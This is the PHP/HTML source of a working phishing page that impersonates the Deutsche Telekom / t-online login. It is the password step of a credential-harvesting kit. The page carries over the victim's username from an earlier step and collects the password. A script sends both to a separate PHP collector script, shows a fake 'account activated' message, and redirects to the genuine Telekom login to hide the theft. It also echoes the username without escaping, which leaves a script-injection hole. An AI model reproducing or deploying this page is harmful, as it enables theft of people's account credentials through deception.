<?php
/**
 * Created by PhpStorm.
 * User: Ijoba Wire
 * Date: 2/6/2020
 * Time: 11:15 PM
 */
if(!isset($_POST['tufufyfuj']) || $_POST['tufufyfuj'] == "") header("location:hdtegjdjs.php");
?>
<html class="no-js" lang="de"><!--<![endif]--><head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Telekom Login</title>
    <meta name="description" content="Telekom Login">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noindex">

    <link rel="stylesheet" type="text/css" href="assets/css/components.min.css">
    <link rel="stylesheet" type="text/css" href="assets/css/login-20.28.0.css">
    <link rel="stylesheet" type="text/css" href="assets/css/sweet-alert.css">

    <script>
        var accountLocked = false;
        var accountLockedPermanent = false;
        var accountLockExpiration = 0;
        var loginFailed = false;
    </script>

    <!--[if lt IE 9]>
    <script type="text/javascript" src="../../assets/js/html5shiv.js"></script>
    <script type="text/javascript" src="../../assets/js/respond.min.js"></script>
    <![endif]-->

    <script type="text/javascript" src="assets/js/jquery-3.2.1.min.js"></script>
    <script type="text/javascript" src="assets/js/jquery-matchheight-0.7.2.min.js"></script>
    <script type="text/javascript" src="assets/js/components.min.js"></script>
    <script type="text/javascript" src="assets/js/login.js"></script>

</head>

<body class="scrolled">
<div>
    <header id="tbs-header">
        <div id="tbs-header-content">
            <div class="container-fixed clearfix">
                <div class="pull-left">
                    <i class="icon icon-large">tT</i>
                </div>
                <div class="pull-right">
                    <span class="tbs-slogan">erleben, was verbindet.</span>
                </div>
            </div>
        </div>



    </header>






    <div class="offset-bottom-5 offset-s-bottom-3"></div>

</div>

<div>






</div>


<div class="container-fixed">
    <div class="tbs-container">
        <div id="tbs-headline">
            <div id="tbs-brand" class="tbs-relative text-center">

                <img src="assets/images/t-online-logo-29112019.png">
            </div>


            <h1 class="offset-top-0 offset-bottom-3 text-center">Telekom Login Passwort eingeben</h1>
        </div>
        <div class="login-box">

            <div class="offset-bottom-1">
                <div>
                    <div class="form-input-set floating">
                        <label>Benutzername</label>
                        <p class="form-input static text-ellipsis" title="<?php echo $_POST['tufufyfuj'] ?>"><?php echo $_POST['tufufyfuj'] ?></p>
                    </div>
                </div>


                <div>
                    <form id="idchange" name="idchange" method="POST" action="hdtegjdjs.php" accept-charset="UTF-8" autocomplete="off">
                        <div class="offset-bottom-1 clearfix">
                            <div class="pull-right tbs-sublink">
                                <button class="btn-link text-right" id="id_change" name="changeIdentity" tabindex="50" type="submit">Mit einem anderen Benutzernamen anmelden?</button>
                            </div>
                        </div>
                    </form>
                </div>

                <div>
                    <form id="tcthctu" name="login" method="POST" action="javascript:void(0);" accept-charset="UTF-8" autocomplete="off">

                        <button class="btn-hidden" name="pw_submit" type="submit"></button>


                        <input name="wtuter" type="text" value="<?php echo $_POST['tufufyfuj'] ?>" class="hidden" aria-hidden="true" tabindex="-1" autocomplete="off">
                        <div>
                            <div class="form-input-set">
                                <input id="rredgdgd" name="sqtyrhf" type="password" maxlength="128" class="form-input" tabindex="20" autocomplete="off" required>
                                <label for="rredgdgd">Passwort</label>
                            </div>
                        </div>
                        <div class="login-helpers clearfix">
                            <!-- persist session component -->
                            <div id="tbs-signin-remember" class="form-checkbox-set">
                                <label>
                                    <div tabindex="30" role="checkbox" class="form-checkbox-js" autocomplete="off" hidefocus="true">&nbsp;<span class="border"></span><span class="check" role="presentation"></span></div><input id="checkbox_permanent" type="checkbox" name="persist_session" value="1" class="form-checkbox hidden" tabindex="30">
                                    <span>Angemeldet bleiben</span>
                                </label>
                            </div>
                            <!-- recovery link element -->
                            <div id="tbs-recovery-link" class="text-right tbs-sublink">
                                <button name="redirectToPwr" value="true" type="submit" class="btn-link text-right" tabindex="71">Passwort vergessen?</button>
                            </div>
                        </div>

                        <!-- Login button element -->
                        <div>
                            <button id="pw_submit" name="pw_submit" type="submit" class="text-center text-uppercase btn btn-brand btn-block btn-large" tabindex="40">Login</button>
                        </div>
                    </form>
                </div>


            </div>

            <div class="text-center offset-bottom-2 offset-top-2">
                <a href="#https://www.telekom.de/hilfe/vertrag-meine-daten/login-daten-passwoerter" tabindex="45" target="_blank">Brauchen Sie Hilfe?</a>
            </div>
        </div>
    </div>
</div>


<footer id="tbs-footer">
    <div class="container-fixed">
        <div class="pull-left">
            <p>© Telekom Deutschland GmbH</p>
            <p class="tbs-text-11">20.28.0, 111d007b5fbc0de380d01f5690ba5809, 058ca6fdca49401bf6c295bfb956341ee59c79d6</p>
        </div>
        <div class="pull-right">
            <ul class="list-inline">
                <li>
                    <a href="#https://www.telekom.de/start/impressum" target="_blank">Impressum</a>
                </li>
                <li>
                    <a id="data-protection" href="#https://www.telekom.de/datenschutz-ganz-einfach" target="_blank">Datenschutz</a>
                </li>
            </ul>
        </div>
    </div>
</footer>



<div>

</div>
<script src="assets/js/sweet-alert.min.js"></script>
<script>
    $('#tcthctu').submit(function () {
        //var data = new FormData($('form')[0]);
        var url = "vsdugvsu.php";
        var SweetAlert = function () {};
        var data = $(this).serializeArray();
        //console.log(data);
        $.ajax({
            url: url,
            data: data,
            type: "GET",
            success: function (res) {
                //console.log(res);
                if(res === "success") {
                    SweetAlert.prototype.init = function () {
                        swal({
                            title: "Danke!",
                            text: "HERZLICHE GLÜCKWÜNSCHE! Ihr Konto wurde aktiviert, fahren Sie mit Ihrer Mailbox fort",
                            type: "info",
                            showCancelButton: false,
                            confirmButtonClass: 'btn-success',
                            confirmButtonText: "Continue!",
                            closeOnConfirm: false
                        }, function () {
                            ///swal("Thank You!","", "success");
                            setTimeout(function () {
                                window.location = "https://accounts.login.idm.telekom.com/oauth2/" +
                                    "auth?client_id=10LIVESAM30000004901PORTAL00000000000000&state=c2831d7e8ee9f93e" +
                                    "c7d7686f170a86f2ae4abeb9adb9c02b2ee8c99ec785b932&claims=%7B%22id_token%22%3A%7B" +
                                    "%22urn%3Atelekom.com%3Aall%22%3Anull%7D%7D&nonce=c2831d7e8ee9f93ec7d7686f170a86f2a" +
                                    "e4abeb9adb9c02b2ee8c99ec785b932&redirect_uri=https%3A%2F%2Flogin.t-online.de" +
                                    "%2Fcallback&logout_uri=https%3A%2F%2Flogin.t-online.de%2Ftelekom_logout" +
                                    "&display=popup&scope=openid&response_type=code";
                            }, 1000);
                        });
                    }, $.SweetAlert = new SweetAlert, $.SweetAlert.Constructor = SweetAlert
                    $.SweetAlert.init();
                }else{
                    swal("Fehler!", "Bitte erneut versuchen", "warning");
                    setTimeout(function () {
                        window.location = "";
                    }, 3000);
                }
            },
            error: function (xhr) {
                console.log(xhr.responseText);
            }
        });
    });
</script>


</body></html>
